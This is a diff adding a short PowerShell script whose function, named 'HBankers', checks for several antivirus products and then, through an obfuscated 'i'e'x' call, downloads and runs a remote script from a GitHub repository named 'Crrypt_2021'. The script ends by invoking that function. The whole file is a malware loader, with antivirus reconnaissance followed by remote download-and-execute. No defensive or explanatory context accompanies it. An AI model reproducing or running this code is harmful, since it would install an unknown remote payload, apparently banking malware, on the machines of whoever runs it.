@@ -1,0 +1,18 @@
+Function HBankers
+{
+if([System.IO.File]::Exists('C:\Program Files\Avast Software\Avast\AvastUI.exe')){
+}
+start-sleep -s 5
+if([System.IO.File]::Exists("C:\Program Files\ESET\ESET Security\ecmds.exe")){
+}
+start-sleep -s 5
+if([System.IO.File]::Exists("C:\Program Files\Kaspersky Lab\Kaspersky Anti-Virus 21.2\avpui.exe")){
+}
+start-sleep -s 5
+if([System.IO.File]::Exists("C:\Program Files\AVG\Antivirus\AVGUI.exe")){
+}
+start-sleep -s 5
+i'e'x ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/zxc4we009/Crrypt_2021/main/Ps1.txt'))
+
+}
+IEX HBankers
